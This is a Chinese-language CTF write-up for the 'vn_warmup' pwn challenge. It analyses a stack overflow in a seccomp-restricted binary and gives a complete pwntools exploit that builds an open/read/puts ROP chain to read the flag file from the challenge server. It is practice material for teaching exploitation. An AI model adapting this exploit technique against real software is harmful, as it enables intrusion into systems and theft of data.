# vn_warmup

## 来源
v & n


## 难度

2 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

程序直接给出了puts在libc中的地址,然后进行两次输入,简要说一下,我还以为是打one_gadget就行,最后找到一个gadget符合的,可是也不能得到shell,原来开启了seccomp保护.如下:

```
logan@LYXF:~/share$ seccomp-tools dump ./vn_pwn_warmup
This is a easy challange for you.
Here is my gift: 0x7fa7988a99c0
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
 0006: 0x20 0x00 0x00 0x00000024  A = count >> 32 # write(fd, buf, count)
 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)
 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

## vul

```c
int sub_9D3()
{
  char buf; // [rsp+0h] [rbp-180h]

  printf("Input something: ");
  read(0, &buf, 0x180uLL); //输入数据到堆栈缓冲区中
  sub_9A1(); //调用该函数
  return puts("Done!");
}

ssize_t sub_9A1()
{
  char buf; // [rsp+0h] [rbp-70h]

  printf("What's your name?");
  return read(0, &buf, 0x80uLL); //存在站溢出
}
```

## 知识点

堆栈溢出利用, 构造ROP链

## 思路

战溢出只能覆盖到ret,但发现他是以两个函数嵌套输入,且外层函数没有其他垃圾变量在缓冲区顶部,第二个存在栈溢出就可以ret中在填写ret地址,那么rsp就会在外层函数的顶部,这样就可以利用外层函数的输入进行构造rop链,就采用open, read,puts来打印flag吧,由于flag字符串在libc中没有,就需要我们手动输入,那就使用read来实现,在libc中找一块空白可读可写的内存,来储存文件名称和打印的flag.

## 利用

### 准备

```python
	ru('0x')
	puts = int(r(12), 16)
	lib.address = puts - lib.sym['puts'] # 计算libc基址

	li('libc_base ' + hex(lib.address))
	ru('something:')
	'''
	read:
	RDI  0x0
	RSI  0x7fffffffeb30 ◂— 0x6562b026
	RDX  0x80
	'''
	pop_rsi = lib.address + 0x00000000000202e8
	pop_rdi = lib.address + 0x0000000000021102
	pop_rdx = lib.address + 0x0000000000001b92
	null = lib.address + 0x7ffff7dd3000 - 0x7ffff7a0d000 # 在libc中可读可写的内存
```

### 构造ROP

```python
# read input file name as flag
	p = p64(pop_rdi) + p64(0x0)   # fd
	p += p64(pop_rsi) + p64(null) # buf
	p += p64(pop_rdx) + p64(0x10) # length
	p += p64(lib.sym['read'])

	# open
	p += p64(pop_rsi) + p64(0x0)  # arg
	p += p64(pop_rdx) + p64(0x0)  # arg 2
	p += p64(pop_rdi) + p64(null) # file name
	p += p64(lib.sym['open'])

	# read input file name as flag
	p += p64(pop_rdi) + p64(0x3)  # fd
	p += p64(pop_rsi) + p64(null) # buf
	p += p64(pop_rdx) + p64(0x80) # length
	p += p64(lib.sym['read'])

	# puts
	p += p64(pop_rdi) + p64(null)
	p += p64(lib.sym['puts'])
	
	s(p)
```

### 堆溢出进行两次ret

```python
	ru('name?')

	ret = 0x0000000000000937 + lib.address
	p = '\x00' * 0x70
	p += p64(null + 0x18)
	p += p64(ret)

	s(p)
```

### 输入flag打印该文件

```python
s('flag\x00')
```

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_warmup'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 29101

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	ru('0x')
	puts = int(r(12), 16)
	lib.address = puts - lib.sym['puts']

	li('libc_base ' + hex(lib.address))
	ru('something:')
	'''
	read:
	RDI  0x0
	RSI  0x7fffffffeb30 ◂— 0x6562b026
	RDX  0x80
	'''
	pop_rsi = lib.address + 0x00000000000202e8
	pop_rdi = lib.address + 0x0000000000021102
	pop_rdx = lib.address + 0x0000000000001b92
	null = lib.address + 0x7ffff7dd3000 - 0x7ffff7a0d000

	# read input file name as flag
	p = p64(pop_rdi) + p64(0x0)   # fd
	p += p64(pop_rsi) + p64(null) # buf
	p += p64(pop_rdx) + p64(0x10) # length
	p += p64(lib.sym['read'])

	# open
	p += p64(pop_rsi) + p64(0x0)  # arg
	p += p64(pop_rdx) + p64(0x0)  # arg 2
	p += p64(pop_rdi) + p64(null) # file name
	p += p64(lib.sym['open'])

	# read input file name as flag
	p += p64(pop_rdi) + p64(0x3)  # fd
	p += p64(pop_rsi) + p64(null) # buf
	p += p64(pop_rdx) + p64(0x80) # length
	p += p64(lib.sym['read'])

	# puts
	p += p64(pop_rdi) + p64(null)
	p += p64(lib.sym['puts'])
	
	s(p)
	ru('name?')

	ret = 0x0000000000000937 + lib.address
	p = '\x00' * 0x70
	p += p64(null + 0x18)
	p += p64(ret)

	s(p)
	#db()
	s('flag\x00')
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

